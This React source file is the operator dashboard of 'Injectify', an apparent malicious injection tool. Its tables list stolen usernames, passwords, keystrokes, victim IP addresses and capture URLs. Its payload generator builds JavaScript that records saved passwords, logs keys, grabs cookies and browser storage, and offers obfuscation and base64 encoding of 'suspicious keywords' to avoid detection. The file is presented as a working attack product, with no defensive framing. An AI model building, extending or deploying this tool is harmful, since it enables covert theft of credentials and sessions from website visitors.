import ReactDOM, { render } from 'react-dom'
import React, { Component } from "react";
import Request from 'react-http-request';
import PropTypes from 'prop-types';
import { withStyles } from 'material-ui/styles';
import Chip from 'material-ui/Chip';
import classNames from 'classnames';
import Drawer from 'material-ui/Drawer';
import AppBar from 'material-ui/AppBar';
import Toolbar from 'material-ui/Toolbar';
import List, { ListItem, ListItemIcon, ListItemText } from 'material-ui/List';
import { MenuItem } from 'material-ui/Menu';
import url from 'url';
import Typography from 'material-ui/Typography';
import TextField from 'material-ui/TextField';
import Divider from 'material-ui/Divider';
import Save from 'material-ui-icons/Save';
import IconButton from 'material-ui/IconButton';
import MenuIcon from 'material-ui-icons/Menu';
import ChevronLeftIcon from 'material-ui-icons/ChevronLeft';
import ChevronRightIcon from 'material-ui-icons/ChevronRight';
import Button from 'material-ui/Button';
import Avatar from 'material-ui/Avatar';
import Tooltip from 'material-ui/Tooltip';
import Radio, { RadioGroup } from 'material-ui/Radio';
import { FormGroup, FormLabel, FormControl, FormControlLabel, FormHelperText } from 'material-ui/Form';
import Timestamp from 'react-timestamp';
import Tabs, { Tab } from 'material-ui/Tabs';
import ListSubheader from 'material-ui/List/ListSubheader';
import Input, { InputLabel } from 'material-ui/Input';
import Paper from 'material-ui/Paper';
import { LinearProgress } from 'material-ui/Progress';
import AddIcon from 'material-ui-icons/Add';
import KeyboardIcon from 'material-ui-icons/Keyboard';
import SettingsIcon from 'material-ui-icons/Settings';
import LockIcon from 'material-ui-icons/Lock';
import CloseIcon from 'material-ui-icons/Close';
import { CircularProgress } from 'material-ui/Progress';
import Slide from 'material-ui/transitions/Slide';
import ReactJson from 'react-json-view';
import {CopyToClipboard} from 'react-copy-to-clipboard';
import SyntaxHighlighter from 'react-syntax-highlighter';
import Card, { CardActions, CardContent } from 'material-ui/Card';
import { atomOneDark } from 'react-syntax-highlighter/styles/hljs';
import { indigo, red } from 'material-ui/colors';
import Switch from 'material-ui/Switch';
import Dialog, {
	DialogActions,
	DialogContent,
	DialogContentText,
	DialogTitle,
} from 'material-ui/Dialog';
import Table, { TableBody, TableCell, TableHead, TableRow } from 'material-ui/Table';

let drawerWidth = 240

function Transition(props) {
  return <Slide direction="up" {...props} />;
}

const styles = theme => ({
  root: {
    width: '100%',
    height: '100%',
    zIndex: 1,
    overflow: 'hidden',
  },
  appFrame: {
    position: 'relative',
    display: 'flex',
    width: '100%',
    height: '100%',
  },
  flex: {
    flex: 1,
  },
  appBar: {
    position: 'absolute',
    transition: theme.transitions.create(['margin', 'width'], {
      easing: theme.transitions.easing.sharp,
      duration: theme.transitions.duration.leavingScreen,
    }),
  },
  noshadow: {
    boxShadow: 'none',
  },
  loading : {
    top: 64,
    width: '100%',
    position: 'absolute',
  },
  tabsLoading: {
    top: 136
  },
  '@media (min-width: 700px)': {
    appBarShift: {
      width: `calc(100% - ${drawerWidth}px)`,
      transition: theme.transitions.create(['margin', 'width'], {
        easing: theme.transitions.easing.easeOut,
        duration: theme.transitions.duration.enteringScreen,
      }),
      marginLeft: drawerWidth,
    },
  },
  leftIcon: {
    marginRight: 10,
  },
  newProject: {
    position: 'absolute',
    bottom: 15,
    right: 15,
  },
  toolbar: {
    minHeight: 64,
  },
  appBarHeader: {
    flex: '1',
    cursor: 'pointer',
    userSelect: 'none',
  },
  avatar: {
    width: 35,
    height: 35,
    marginLeft: 8,
  },
  menuButton: {
    marginLeft: 12,
    marginRight: 20,
  },
  recordContent: {
    paddingTop: 75,
  },
  hide: {
    display: 'none',
  },
  drawerPaper: {
    position: 'relative',
    height: '100%',
    width: drawerWidth,
  },
  drawerHeader: {
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'flex-end',
    padding: '0 8px',
    ...theme.mixins.toolbar,
  },
  content: {
    width: '100%',
    flexGrow: 1,
    backgroundColor: theme.palette.background.default,
    marginLeft: -drawerWidth,
    padding: theme.spacing.unit * 3,
    transition: theme.transitions.create('margin', {
      easing: theme.transitions.easing.sharp,
      duration: theme.transitions.duration.leavingScreen,
    }),
    height: 'calc(100% - 96px)',
    overflow: 'scroll',
    marginTop: 64,
    [theme.breakpoints.up('sm')]: {
      content: {
        height: 'calc(100% - 64px)',
        marginTop: 64,
      },
    },
  },
  tabsContent: {
    marginTop: 136,
    height: 'calc(100% - 167px)',
  },
  '@media (max-width: 699px)': {
    content: {
      marginLeft: 0,
    },
    drawerPaper: {
      flex: 'none',
      width: '256px !important',
    },
  },
  contentShift: {
    transition: theme.transitions.create('margin', {
      easing: theme.transitions.easing.easeOut,
      duration: theme.transitions.duration.enteringScreen,
    }),
    marginLeft: 0,
  },
  paper: {
    display: 'inline-block',
    minWidth: '100%',
  },
  contentCard: {
  },
  tableCell: {
    padding: '4px 25px',
  },
  center: {
    textAlign: 'center',
  },
  '@media (max-width: 500px)': {
    content: {
      padding: theme.spacing.unit * 3 + "px " + theme.spacing.unit + "px",
    },
    tableCell: {
      padding: '4px 15px',
    }
  },
  '@media (max-width: 400px)': {
    content: {
      padding: theme.spacing.unit * 2 + "px " + theme.spacing.unit * .5 + "px",
    },
    tableCell: {
      padding: '4px 5px',
      textAlign: 'center',
    }
  },
  code: {
    whiteSpace: 'pre-wrap',
    wordWrap: 'break-word',
    maxHeight: '100%',
    padding: '0.5em 1em !important',
  },
  codeDialog: {
    background: '#282C34',
  },
  transparent: {
    background: 'none !important',
    boxShadow: 'none !important',
    overflow: 'hidden !important',
  },
  tabs: {
    background: indigo[600]
  },
  chip: {
    margin: 5,
  },
  row: {
    display: 'flex',
    justifyContent: 'center',
    flexWrap: 'wrap',
  },
  title: {
    marginBottom: 16,
    fontSize: 14,
    color: 'rgb(57, 72, 171)',
  },
  changeName: {
    display: 'flex',
  },
  changeNameInput: {
    flexGrow: 1,
  },
  changeNameButton: {
    margin: 10,
  }
})

class PersistentDrawer extends Component {
  state = {
    open: false,
    recordOpen: false,
    currentProject: null,
    loading: false,
    tab: 0,
  };

  componentWillReceiveProps(nextProps) {
    if (nextProps.parentState.user.login !== this.props.parentState.user.login && this.props.parentState.width >= 700) {
      if (nextProps.parentState.user.login) {
        this.setState({ open: true })
      } else {
        this.setState({ open: false })
      }
    }
    if (nextProps.parentState.project !== this.props.parentState.project) {
      this.loading(false)
      this.setState({ currentProject: nextProps.parentState.project})
    }
  }

  componentWillMount() {
    if (window.location.href.slice(-10) == "/passwords") this.setState({tab: 0})
    if (window.location.href.slice(-10) == "/keylogger") this.setState({tab: 1})
    if (window.location.href.slice(-7 ) ==    "/config") this.setState({tab: 2})
  }

  componentDidMount() {
    let { socket } = this.props

    socket.on(`err`, error => {
			this.setState({
        loading: false,
      })
		})
  }

  handleDrawerOpen = () => {
    this.setState({ open: true })
  }

  handleDrawerClose = () => {
    this.setState({ open: false })
  }

  handleRecordOpen = (record) => {
    this.setState({
      recordOpen: true,
      record: record
    })
  };

  handleRecordClose = () => {
    this.setState({ recordOpen: false });
  };

  returnHome = () => {
    this.setState({ currentProject: null })
    this.props.emit("project:close")
    window.history.pushState('', 'Injectify', '/')
    document.getElementsByTagName('title')[0].innerHTML = 'Injectify'
  }

  loading = value => {
    this.setState({
      loading: value
    })
  }

  signOut = () => {
    this.returnHome()
    this.props.signOut()
  }

	viewJSON = () => {
		window.open("/api/" + encodeURIComponent(this.props.token) + "/" + encodeURIComponent(this.state.currentProject.name) /*+ "&download=true"*/)
  }

  changeTab = (event, value) => {
    this.setState({ tab: value })
    if (value == 0) window.history.pushState('', ' - Injectify', '/projects/' + encodeURIComponent(this.state.currentProject.name) + '/passwords') 
    if (value == 1) window.history.pushState('', ' - Injectify', '/projects/' + encodeURIComponent(this.state.currentProject.name) + '/keylogger') 
    if (value == 2) window.history.pushState('', ' - Injectify', '/projects/' + encodeURIComponent(this.state.currentProject.name) + '/config') 
  }

  render() {
    const { classes, theme, signIn } = this.props;
    const { open } = this.state;

    return (
      <div className={classes.root}>
        <div className={classes.appFrame}>
          <AppBar
            className={`${classNames(classes.appBar, {
              [classes.appBarShift]: open,
            })} ${this.state.loading ? classes.noshadow : ""}`}
          >
            <Toolbar className={classes.toolbar}>
              <IconButton
                color="contrast"
                aria-label="open drawer"
                onClick={this.handleDrawerOpen}
                className={classNames(classes.menuButton, open && classes.hide)}
              >
                <MenuIcon />
              </IconButton>
              <Typography type="title" color="inherit" noWrap className={classes.appBarHeader} onClick={this.returnHome.bind(this)}>
                  Injectify [BETA]
              </Typography>
              {this.props.parentState.user.login ? (
                  <Tooltip title="Log out" placement="bottom">
                    <Button color="contrast" onClick={this.signOut} className="signed-in">
                      {this.props.parentState.user.login}
                      <Avatar src={`${this.props.parentState.user.avatar_url}&s=40`} className={classes.avatar}/>
                    </Button>
                  </Tooltip>
                ) : (
                  <Button color="contrast" onClick={signIn} autoFocus>
                    Login with GitHub
                  </Button>
                )
              }
            </Toolbar>
            {this.state.currentProject ? (
              <Tabs
                value={this.state.tab}
                onChange={this.changeTab}
                indicatorColor={indigo[100]}
                fullWidth
                className={classes.tabs}
              >
                <Tab label="Passwords" icon={<LockIcon />} disabled={this.state.loading} />
                <Tab label="Keylogger" icon={<KeyboardIcon />} disabled={this.state.loading} />
                <Tab label="Project config" icon={<SettingsIcon />} disabled={this.state.loading} />
              </Tabs>
            ) : null
          }
          </AppBar>
          {this.state.loading ? (<LinearProgress className={`${classes.loading} ${this.state.currentProject ? classes.tabsLoading : ''}`} /> ) : null}
          <Drawer
            type={this.props.parentState.width >= 700 ? "persistent" : ''}
            classes={{
              paper: classes.drawerPaper,
            }}
            open={open}
            onRequestClose={this.handleDrawerClose.bind(this)}
          >
            <div className={classes.drawerInner}>
              <div className={classes.drawerHeader}>
                <IconButton onClick={this.handleDrawerClose}>
                  {theme.direction === 'rtl' ? <ChevronRightIcon /> : <ChevronLeftIcon />}
                </IconButton>
              </div>
              <ProjectList p={this.props} projects={this.props.parentState.projects} projectData={this.props.parentState.project} emit={this.props.emit} classes={classes} token={this.props.token} loading={this.loading.bind(this)} closeDrawer={this.handleDrawerClose.bind(this)}/>
            </div>
          </Drawer>
          {this.state.currentProject ? (
            <main
              className={`${classNames(classes.content, classes[`content`], {
                [classes.contentShift]: open,
              })} ${classes.tabsContent}`}
            >
              {this.state.tab === 0 && 
                <span>
                  <Paper className={classes.paper}>
                    <Table>
                      <TableHead>
                        <TableRow>
                          <TableCell className={classes.tableCell}>
                            Time
                          </TableCell>
                          <TableCell className={classes.tableCell}>
                            Username
                          </TableCell>
                          <TableCell className={classes.tableCell}>
                            Password
                          </TableCell>
                          <TableCell className={`${classes.tableCell} ${classes.center}`} width={64}>
                            Details
                          </TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        {this.state.currentProject.passwords.map((record, i) => {
                          return (
                            <TableRow key={i}>
                              <TableCell className={classes.tableCell}>
                                <Timestamp
                                  time={record.timestamp}
                                  format='ago'
                                  precision={this.props.parentState.width > 700 ? 2 : 1}
                                  autoUpdate={5}
                                />
                              </TableCell>
                              <TableCell className={classes.tableCell}>
                                {record.username}
                              </TableCell>
                              <TableCell className={classes.tableCell}>
                                {record.password}
                              </TableCell>
                              <TableCell className={classes.tableCell} numeric>
                                <Tooltip
                                  title={
                                    <span>
                                      {record.url.href && url.parse(record.url.href).hostname && record.url.title ? (
                                        <span>
                                          {url.parse(record.url.href).hostname} ({record.url.title})
                                          <br/>
                                        </span>
                                      ) : null}
                                      {record.ip.query && record.ip.country ? (
                                        <span>
                                          {record.ip.query} ({record.ip.country})
                                          <br/>
                                        </span>
                                      ) : null}
                                    </span>
                                  }
                                  placement="left"
                                  disableTriggerFocus
                                  disableTriggerTouch
                                >
                                  <Button color="primary" dense onClick={() => {this.handleRecordOpen(record)}}>
                                    More
                                  </Button>
                                </Tooltip>
                              </TableCell>
                            </TableRow>
                          )
                        })}
                      </TableBody>
                    </Table>
                  </Paper>
                  <br />
                  <Javascript parentState={this.state} notify={this.props.notify} classes={classes} />
                  <Tooltip title="Show the raw JSON database entries" placement="bottom">
                    <Button onClick={this.viewJSON} color="primary">
                      View JSON
                    </Button>
                  </Tooltip>
                  {this.state.recordOpen ? (
                    <Dialog
                      fullScreen
                      open={this.state.recordOpen}
                      onRequestClose={this.handleRecordClose}
                      transition={Transition}
                    >
                      <AppBar>
                        <Toolbar>
                          <IconButton color="contrast" onClick={this.handleRecordClose} aria-label="Close">
                            <CloseIcon />
                          </IconButton>
                          <Typography type="title" color="inherit" className={classes.flex}>
                            Password record for {this.state.currentProject.name}
                          </Typography>
                          {/* <Button color="contrast" onClick={this.handleRecordClose}>
                            save
                          </Button> */}
                        </Toolbar>
                      </AppBar>
                      <List className={classes.recordContent}>
                        <CopyToClipboard text={this.state.record.timestamp}
                          onCopy={() => this.props.notify({
                            title: "Copied to clipboard!",
                            message: this.state.record.timestamp
                          })}>
                          <ListItem button>
                            <ListItemText primary="Timestamp" secondary={<Timestamp time={this.state.record.timestamp} format='full' />} />
                          </ListItem>
                        </CopyToClipboard>
                        <Divider />
                        <CopyToClipboard text={this.state.record.username}
                          onCopy={() => this.props.notify({
                            title: "Copied to clipboard!",
                            message: this.state.record.username
                          })}>
                          <ListItem button>
                            <ListItemText primary="Username" secondary={this.state.record.username} />
                          </ListItem>
                        </CopyToClipboard>
                        <Divider />
                        <CopyToClipboard text={this.state.record.password}
                          onCopy={() => this.props.notify({
                            title: "Copied to clipboard!",
                            message: this.state.record.password
                          })}>
                          <ListItem button>
                            <ListItemText primary="Password" secondary={this.state.record.password} />
                          </ListItem>
                        </CopyToClipboard>
                        <Divider />
                        {this.state.record.url.href ? (
                            <span>
                              <ListItem button onClick={() => {window.open(this.state.record.url.href).bind}}>
                                <ListItemText primary="Capture URL" secondary={this.state.record.url.href} />
                              </ListItem>
                              <Divider />
                            </span>
                          ) : null
                        }
                        <ListItem button onClick={() => {window.open("https://tools.keycdn.com/geo?host=" + this.state.record.ip.query)}}>
                          <ListItemText primary="IP Address" secondary={`${this.state.record.ip.query}${this.state.record.ip.country ? " (" + this.state.record.ip.city + " - " + this.state.record.ip.country + ")" : ""}`} />
                        </ListItem>
                        <Divider />
                        <CopyToClipboard text={`${this.state.record.browser.height}x${this.state.record.browser.width}px`}
                          onCopy={() => this.props.notify({
                            title: "Copied to clipboard!",
                            message: this.state.record.browser.height + "x" + this.state.record.browser.width + "px"
                          })}>
                          <ListItem button>
                            <ListItemText primary="Screen resolution" secondary={`${this.state.record.browser.height}x${this.state.record.browser.width}px`} />
                          </ListItem>
                        </CopyToClipboard>
                        <Divider />
                        <br />
                        <ListItem>
                          <ReactJson src={this.state.record} />
                        </ListItem>
                      </List>
                    </Dialog>
                    ) : null
                  }
                </span>
              }
              {this.state.tab === 1 && 
                <span>
                  <Paper className={classes.paper}>
                    <Table>
                      <TableHead>
                        <TableRow>
                          <TableCell className={classes.tableCell}>
                            Time
                          </TableCell>
                          <TableCell className={classes.tableCell}>
                            Keystrokes
                          </TableCell>
                          <TableCell className={classes.tableCell}>
                            IP Address
                          </TableCell>
                          <TableCell className={`${classes.tableCell} ${classes.center}`} width={64}>
                            Details
                          </TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        {this.state.currentProject.keylogger.map((record, i) => {
                          return (
                            <TableRow key={i}>
                              <TableCell className={classes.tableCell}>
                                <Timestamp
                                  time={record.timestamp}
                                  format='ago'
                                  precision={this.props.parentState.width > 700 ? 2 : 1}
                                  autoUpdate={5}
                                />
                              </TableCell>
                              <TableCell className={classes.tableCell}>
                                {Math.round(record.keys.length / 2)}
                              </TableCell>
                              <TableCell className={classes.tableCell}>
                                {record.ip.query}
                              </TableCell>
                              <TableCell className={classes.tableCell} numeric>
                                <Tooltip
                                  title={
                                    <span>
                                      {record.url.href && url.parse(record.url.href).hostname && record.url.title ? (
                                        <span>
                                          {url.parse(record.url.href).hostname} ({record.url.title})
                                          <br/>
                                        </span>
                                      ) : null}
                                      {record.ip.query && record.ip.country ? (
                                        <span>
                                          {record.ip.query} ({record.ip.country})
                                          <br/>
                                        </span>
                                      ) : null}
                                    </span>
                                  }
                                  placement="left"
                                  disableTriggerFocus
                                  disableTriggerTouch
                                >
                                  <Button color="primary" dense onClick={() => {this.handleRecordOpen(record)}}>
                                    More
                                  </Button>
                                </Tooltip>
                              </TableCell>
                            </TableRow>
                          )
                        })}
                      </TableBody>
                    </Table>
                  </Paper>
                  <Tooltip title="Show the raw JSON database entries" placement="bottom">
                    <Button onClick={this.viewJSON} color="primary">
                      View JSON
                    </Button>
                  </Tooltip>
                  {this.state.recordOpen ? (
                    <Dialog
                      fullScreen
                      open={this.state.recordOpen}
                      onRequestClose={this.handleRecordClose}
                      transition={Transition}
                    >
                      <AppBar>
                        <Toolbar>
                          <IconButton color="contrast" onClick={this.handleRecordClose} aria-label="Close">
                            <CloseIcon />
                          </IconButton>
                          <Typography type="title" color="inherit" className={classes.flex}>
                            Keylogger record for {this.state.currentProject.name}
                          </Typography>
                          {/* <Button color="contrast" onClick={this.handleRecordClose}>
                            save
                          </Button> */}
                        </Toolbar>
                      </AppBar>
                      <List className={classes.recordContent}>
                        <CopyToClipboard text={this.state.record.timestamp}
                          onCopy={() => this.props.notify({
                            title: "Copied to clipboard!",
                            message: this.state.record.timestamp
                          })}>
                          <ListItem button>
                            <ListItemText primary="Timestamp" secondary={<Timestamp time={this.state.record.timestamp} format='full' />} />
                          </ListItem>
                        </CopyToClipboard>
                        <Divider />
                        {this.state.record.url.href ? (
                            <span>
                              <ListItem button onClick={() => {window.open(this.state.record.url.href).bind}}>
                                <ListItemText primary="Capture URL" secondary={this.state.record.url.href} />
                              </ListItem>
                              <Divider />
                            </span>
                          ) : null
                        }
                        <ListItem button onClick={() => {window.open("https://tools.keycdn.com/geo?host=" + this.state.record.ip.query)}}>
                          <ListItemText primary="IP Address" secondary={`${this.state.record.ip.query}${this.state.record.ip.country ? " (" + this.state.record.ip.city + " - " + this.state.record.ip.country + ")" : ""}`} />
                        </ListItem>
                        <Divider />
                        <br />
                        <ListItem>
                          <ReactJson src={this.state.record} />
                        </ListItem>
                      </List>
                    </Dialog>
                    ) : null
                  }
                </span>
              }
              {this.state.tab === 2 && 
                <ProjectConfig classes={classes} project={this.state.currentProject} loggedInUser={this.props.parentState.user} emit={this.props.emit} loading={this.loading} />
              }
              <Tooltip title="New project" placement="left">
                <Button fab color="primary" aria-label="add" className={classes.newProject} onClick={this.props.newProject}>
                  <AddIcon />
                </Button>
              </Tooltip>
            </main>
              ) : (
                <main
                  className={classNames(classes.content, classes[`content`], {
                    [classes.contentShift]: open,
                  })}
                >
                  {this.props.children}
                  <Tooltip title="New project" placement="left">
                    <Button fab color="primary" aria-label="add" className={classes.newProject} onClick={this.props.newProject}>
                      <AddIcon />
                    </Button>
                  </Tooltip>
                </main>
            )
          }
        </div>
      </div>
    )
  }
}

class ProjectList extends Component {
	render() {
    const { classes, theme } = this.props;
		if (this.props.projects && this.props.projects[0]) {
			return (
        <div>
          <List className={classes.list} subheader={<ListSubheader>My account</ListSubheader>}>
            <ListItem button>
              <ListItemIcon>
                <SettingsIcon />
              </ListItemIcon>
              <ListItemText primary="Configuration" />
            </ListItem>
          </List>
          <Divider />
          <List className={classes.list} subheader={<ListSubheader>My projects</ListSubheader>}>
            {this.props.projects.map((project, i) =>
              <Project raised color="primary" key={i} record={project.name} p={this.props} />
            )}
          </List>
        </div>
			)
		} else {
			return null
		}
	}
}

class Project extends Component {
	handleClickOpen = (a) => {
    if(this.props.p.p.parentState.width <= 700) this.props.p.closeDrawer()
    this.props.p.emit("project:close", {
			name: this.props.record
		})
		this.props.p.emit("project:read", {
			name: this.props.record
    })
    this.props.p.loading(true)
    window.history.pushState('', this.props.record + ' - Injectify', '/projects/' + encodeURIComponent(this.props.record))
	}

	render() {
		return (
      <ListItem button onClick={this.handleClickOpen} className={this.props.p.projectData && this.props.p.projectData.name == this.props.record ? "active" : null}>
        <ListItemText primary={this.props.record} />
      </ListItem>
		)
	}
}

class Javascript extends Component {
  state = {
    open: false,
    javascriptURL: false,
    options: {
      format: 'minified',
      cookies: true,
      storage: false,
      passwords: true,
      keylogger: false,
      base64: true,
      bypassCors: false,
    },
  }

  handleClickOpen = () => {
    this.setState({ open: true })
  }

  handleRequestClose = () => {
    this.setState({
      open: false
    })
    setTimeout(() => {
      this.setState({
        javascriptURL: false
      })
    }, 300)
  }

  componentWillMount() {
    let savedOptions
    try {
      savedOptions = JSON.parse(localStorage.getItem("payload-generator"))
    } catch(e) {
      localStorage.setItem("payload-generator", '')
      return
    }
    if (savedOptions && Object.keys(savedOptions).length == Object.keys(this.state.options).length) {
      this.setState({ options: savedOptions})
    } else {
      localStorage.setItem("payload-generator", '')
    }
  }

  componentDidUpdate() {
    localStorage.setItem("payload-generator", JSON.stringify(this.state.options))
  }

  viewJS = () => {
    let params = ''
    if (this.state.options.cookies == false) params += "&cookies=false"
    if (this.state.options.storage == false) params += "&sessionStorage=false&localStorage=false"
    if (this.state.options.format == 'commented') params += "&comments=true"
    if (this.state.options.format == 'minified') params += "&minify=true"
    if (this.state.options.format == 'obfuscated') params += "&obfuscate=true"
    if (this.state.options.passwords == false) params += "&passwords=false"
    if (this.state.options.keylogger == true) params += "&keylogger=true"
    if (this.state.options.base64 == false) params += "&base64=false"
    if (this.state.options.bypassCors == true) params += "&bypassCors=true"
    this.setState({
      javascriptURL: "/payload/?project=" + encodeURIComponent(this.props.parentState.currentProject.name) + params
    })
  }

  back = () => {
    this.setState({
      javascriptURL: false
    })
  }

  raw = () => {
    window.open(this.state.javascriptURL, '_blank')
  }

  render() {
    return (
      <div>
        <Tooltip title="Payload for this project" placement="bottom">
          <Button onClick={this.handleClickOpen} color="primary">
            Javascript code
          </Button>
        </Tooltip>  
          {this.state.javascriptURL ? (
            <div>              
              <Request
                url={this.state.javascriptURL}
                method='get'
                verbose={true}
              >
                {
                  ({error, result, loading}) => {
                    if (loading) {
                      return (
                        <Dialog open={this.state.open} classes={{ paper: this.props.classes.transparent }}>
                          <CircularProgress size={60} style={{ color: indigo[50] }} />
                        </Dialog>
                      )
                    } else {
                      return (
                        <div>
                          <Dialog open={this.state.open} onRequestClose={this.handleRequestClose} classes={{ paper: this.props.classes.codeDialog}}>
                            <SyntaxHighlighter showLineNumbers language='javascript' style={atomOneDark} height={200} className={this.props.classes.code}>
                              {result.text}
                            </SyntaxHighlighter>
                            <DialogActions>
                              <Button onClick={this.back.bind(this)} color="contrast">
                                Back
                              </Button>
                              <Button onClick={this.raw.bind(this)} color="contrast">
                                Raw
                              </Button>
                              <CopyToClipboard text={result.text}
                                onCopy={() => this.props.notify({
                                  title: "Copied to clipboard!",
                                  message: "Try testing it in DevTools"
                              })}>
                                <Button color="contrast">
                                  Copy
                                </Button>
                              </CopyToClipboard>
                            </DialogActions>
                          </Dialog>
                        </div>
                      )
                    }
                  }
                }
              </Request>
            </div>
          ) : (
            <Dialog open={this.state.open} onRequestClose={this.handleRequestClose}>
              <DialogTitle>Payload generator</DialogTitle>
              <DialogContent>
                <DialogContentText>
                  Select the options you want your payload to have / not have
                </DialogContentText>
                <FormGroup>
                  <FormControlLabel
                    control={
                      <Switch
                        checked={this.state.options.passwords}
                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, passwords: checked } } )}
                      />
                    }
                    label="Record saved passwords"
                  />
                  <FormControlLabel
                    control={
                      <Switch
                        checked={this.state.options.keylogger}
                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, keylogger: checked } } )}
                        disabled={this.state.options.bypassCors ? true : false}
                      />
                    }
                    label="Record keystrokes (keylogger)"
                  />
                  <FormControlLabel
                    control={
                      <Switch
                        checked={this.state.options.cookies}
                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, cookies: checked } } )}
                      />
                    }
                    label="Capture browser cookies"
                  />
                  <FormControlLabel
                    control={
                      <Switch
                        checked={this.state.options.storage}
                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, storage: checked } } )}
                      />
                    }
                    label="Capture local &amp; session storage"
                  />
                  <Divider inset />
                  <FormControlLabel
                    control={
                      <Switch
                        checked={this.state.options.base64}
                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, base64: checked } } )}
                      />
                    }
                    label="Base64 encode suspicious keywords"
                  />
                  <FormControlLabel
                    control={
                      <Switch
                        checked={this.state.options.bypassCors}
                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, bypassCors: checked } } )}
                      />
                    }
                    label="Bypass CORS (redirects page)"
                  />
                  <Divider inset />
                <FormControl component="fieldset">
                  <RadioGroup
                    value={this.state.options.format}
                    onChange={(event, value) => this.setState({ options: { ...this.state.options, format: value }})}
                  >
                    <FormControlLabel value="minified" control={<Radio />} label="Minified" />
                    <FormControlLabel value="obfuscated" control={<Radio />} label="Obfuscated" />
                    <FormControlLabel value="formatted" control={<Radio />} label="Formatted" />
                    <FormControlLabel value="commented" control={<Radio />} label="Commented" />
                  </RadioGroup>
                </FormControl>
                </FormGroup>
              </DialogContent>
              <DialogActions>
                <Button onClick={this.handleRequestClose} color="primary">
                  Cancel
                </Button>
                <Button onClick={this.viewJS} color="primary">
                  Generate
                </Button>
              </DialogActions>
            </Dialog>
          )}
      </div>
    )
  }
}

class ProjectConfig extends Component {
  state = {
    open: false,
    user: {},
    inputChanged: false,
  }

  save = () => {
    if (this.props.project.name == this.newName.value) return
    this.props.loading(true)
    this.props.emit("project:modify", {
      project: this.props.project.name,
      command: "project:rename",
      newName: this.newName.value
    })
  }

  handleChange = prop => event => {
    let newName = event.target.value
    if (newName !== this.props.project.name)
      this.setState({ inputChanged: true })
    else
      this.setState({ inputChanged: false })
  }

  componentWillReceiveProps(nextProps) {
    if (nextProps.project.name == this.props.project.name) return
    if (this.newName.value !== nextProps.project.name)
      this.setState({ inputChanged: true })
    else
      this.setState({ inputChanged: false })
  }

  handleKeypress = (e) => {
    if (e.key === 'Enter') {
      this.save()
    }
  }

  handleClickOpen = () => {
    this.setState({ open: true });
  }

  handleRequestClose = () => {
    this.setState({ open: false });
  }

  handleRequestDelete = data => () => {
    this.setState({ user: data })
    this.handleClickOpen()
  }

  handleDelete = () => {
    this.props.emit("project:modify", {
      project: this.props.project.name,
      command: "permissions:remove",
      user: this.state.user.id
    })
    this.handleRequestClose()
  }

  render() {
    const { classes, project, loggedInUser } = this.props;
    return (
      <span>
        <Card className={classes.contentCard}>
          <CardContent>
            <Typography type="body1" className={classes.title}>
              Project configuration
            </Typography>
            <div className={classes.changeName}>
              <FormControl className={classes.changeNameInput}>
                <InputLabel htmlFor="project-name">Name</InputLabel>
                <Input
                  id="project-name"
                  defaultValue={project.name}
                  inputProps={{
                    autoCorrect: false,
                    spellCheck: false,
                  }}
                  onChange={this.handleChange('project-name')}
                  onKeyPress={this.handleKeypress}
                  disabled={!project.permissions.owners.includes(loggedInUser.id)}
                  inputRef={input => { this.newName = input }} />
              </FormControl>
              <Button
                dense
                onClick={this.save.bind(this)}
                disabled={!this.state.inputChanged}
                className={classes.changeNameButton}
              >
                <Save
                  className={classes.leftIcon} />
                Save
              </Button>
            </div>
            <Typography type="title" gutterBottom>
              Owners:
            </Typography>
            {project.permissions.owners.length > 0 ? (
              <div className={classes.row}>
                {project.permissions.owners.map((id, i) => {
                  return (
                   <UserChip key={i} id={id} removeUser={this.handleRequestDelete.bind(this)} classes={classes} />
                  )
                })}
              </div>
            ) : (
              <span>
                none
              </span>
            )}
            <Divider light />


            {/* <Typography type="title" gutterBottom>
              Admins:
            </Typography>
            {project.permissions.admins.length > 0 ? (
              project.permissions.admins.map((id, i) => {
                return (
                  <UserChip key={i} id={id} removeUser={this.handleRequestDelete.bind(this)} />
                )
              })
            ) : (
              <span>
                none
              </span>
            )}
            <Divider light />
            <Typography type="title" gutterBottom>
              View-only access:
            </Typography>
            {project.permissions.readonly.length > 0 ? (
              project.permissions.readonly.map((id, i) => {
                return (
                  <UserChip key={i} id={id} removeUser={this.handleRequestDelete.bind(this)} />
                )
              })
            ) : (
              <span>
                none
              </span>
            )} */}
          </CardContent>
          <CardActions>

          </CardActions>
        </Card>
        <Dialog open={this.state.open} onRequestClose={this.handleRequestClose}>
          <DialogTitle>
            {loggedInUser.id == this.state.user.id ? (
              "Remove yourself from " + project.name + "?"
            ) : (
              "Remove user " + this.state.user.login + " from " + project.name + "?"
            )}
          </DialogTitle>
          <DialogContent>
            <DialogContentText>
              {loggedInUser.id == this.state.user.id ? (
                <span>
                  You will <b>lose access</b> to this project!
                </span>
              ) : (
                "They won't be able to access this project again (you can re-add them later)"
              )}
            </DialogContentText>
          </DialogContent>
          <DialogActions>
            <Button onClick={this.handleRequestClose} color="primary" autoFocus>
              Cancel
            </Button>
            <Button onClick={this.handleDelete.bind(this)} color={loggedInUser.id == this.state.user.id ? "accent" : "primary"}>
              {loggedInUser.id == this.state.user.id ? (
                "Remove myself"
              ) : (
                "Remove"
              )}
            </Button>
          </DialogActions>
        </Dialog>
      </span>
    )
  }
}

class UserChip extends Component {
  render() {
    const { id, removeUser, classes } = this.props;
    return (
      <Request
        url={`https://api.github.com/user/${id}`}
        method='get'
        accept='application/json'
      >
        {
          ({error, result, loading}) => {
            if (loading) {
              return null
            } else {
              if (error) return
              let user = result.body
              return (
                <Chip
                  avatar={<Avatar src={user.avatar_url + "&s=40"} />}
                  label={user.login}
                  onRequestDelete={removeUser(user)}
                  className={classes.chip}
                />
              )
            }
          }
        }
      </Request>
    )
  }
}

PersistentDrawer.propTypes = {
  classes: PropTypes.object.isRequired,
  theme: PropTypes.object.isRequired,
};

export default withStyles(styles, { withTheme: true })(PersistentDrawer);